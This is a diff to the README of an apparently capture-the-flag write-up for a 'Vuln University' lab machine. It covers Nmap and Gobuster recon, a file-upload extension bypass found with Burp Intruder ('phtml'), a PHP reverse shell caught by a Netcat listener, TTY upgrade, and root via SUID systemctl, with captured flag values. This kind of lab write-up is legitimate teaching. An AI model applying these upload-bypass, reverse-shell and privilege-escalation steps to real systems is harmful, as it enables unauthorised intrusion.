@@ -26,7 +26,7 @@ A full TCP port scan with service/version detection and safe-script scanning was
 nmap -sC -sV -p- --min-rate=300 --max-retries=3 -Pn 10.48.163.67 -oN nmap_full.txt
 ```
 
-![Nmap scan results](readme_images/nmap.png)
+![Nmap scan results](nmap.png)
 *Figure 1 — Nmap scan revealing FTP, SSH, Samba, Squid proxy, and an Apache instance titled "Vuln University" on port 3333.*
 
 The scan identified six open services, most notably:
@@ -48,7 +48,7 @@ gobuster dir -u http://10.48.163.67:3333 \
   -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40
 ```
 
-![Gobuster results](readme_images/gobuster.png)
+![Gobuster results](gobuster.png)
 *Figure 2 — Gobuster uncovers a hidden `/internal/` directory (HTTP 301) alongside standard asset folders.*
 
 The `/internal/` path resolved to a file upload form with no authentication in front of it — a strong candidate for an unrestricted file upload vulnerability.
@@ -57,15 +57,42 @@ The `/internal/` path resolved to a file upload form with no authentication in f
 
 A benign `test.php` file was uploaded through the form while intercepting the request in Burp Suite's Proxy. The server rejected the `.php` extension outright ("Extension not allowed"), confirming an extension blacklist was in place:
 
-![Burp intercept](readme_images/burp_intercept.png)
+![Burp intercept](burp_intercept.png)
 *Figure 3 — Burp Proxy intercepting the multipart/form-data POST request carrying the uploaded filename.*
 
 The intercepted request was sent to Burp Intruder to fuzz the file extension against a small custom wordlist of common PHP-executable variants (`php3`, `php4`, `php5`, `php7`, `pht`, `phtml`, `phar`), with the payload position set on the extension only:
 
-![Intruder payload position](readme_images/intruder_position.png)
+![Intruder payload position](intruder_position.png)
 *Figure 4 — Payload position isolated to the file extension (`test.§php§`) ahead of the Intruder attack.*
 
 Most extensions returned an identical rejection response. One entry stood apart — **`phtml`**
+returned a shorter response body (760 bytes vs. ~773–774 for the rest) containing "Success" instead of the standard rejection message, confirming it bypassed the filter:
+
+![Intruder results](intruder_results.png)
+*Figure 5 — Intruder results: the `phtml` payload returns a distinct response length and a "Success" body, unlike every other tested extension.*
+
+With the bypass confirmed, a PHP reverse shell (Pentestmonkey's `php-reverse-shell.php`) was renamed to `shell.phtml`, configured with the attacker's VPN IP and listening port, and uploaded through the same form. A Netcat listener was started beforehand, and the uploaded file was triggered by requesting its path directly:
+
+```bash
+nc -lvnp 4444
+# then, in the browser:
+http://10.48.163.67:3333/internal/uploads/shell.phtml
+```
+
+## 5. Post-Exploitation — Shell Access & User Flag
+
+The reverse shell connected back successfully as the low-privileged web service account (`www-data`). The shell was upgraded to a fully interactive TTY using Python's `pty` module, and the filesystem was searched for the user flag:
+
+```bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+find / -name "user.txt" 2>/dev/null
+cat /home/bill/user.txt
+```
+
+![Shell and user flag](shell_userflag.png)
+*Figure 6 — Stable `www-data` shell confirmed (uid=33), with the user flag retrieved from `/home/bill/user.txt`.*
+
+**User flag captured:*8bd7992fbe8a6ad22a63361004cfcedb*
 
 
 ## 6. Privilege Escalation — SUID `systemctl`
@@ -82,7 +109,7 @@ Among the results, **`/bin/systemctl`** stood out immediately — this binary sh
 ls -la /bin/systemctl
 ```
 
-![SUID confirmation](readme_images/suid_confirm.png)
+![SUID confirmation](suid_confirm.png)
 *Figure 7 — `/bin/systemctl` owned by root with the SUID bit set (`-rwsr-xr-x`), confirming a viable privilege escalation path.*
 
 This is a documented [GTFOBins](https://gtfobins.github.io/gtfobins/systemctl/) technique: `systemctl status` pipes long output through the `less` pager. Escaping `less` with a shell command while `systemctl` is running as root (via SUID) spawns that shell with the same elevated privileges:
@@ -103,7 +130,7 @@ ls
 cat root.txt
 ```
 
-![Root flag](readme_images/root_flag.png)
+![Root flag](root_flag.png)
 *Figure 8 — Root shell confirmed (`root@vulnuniversity`) with the root flag read from `/root/root.txt`.*
 
 **Root flag captured:**
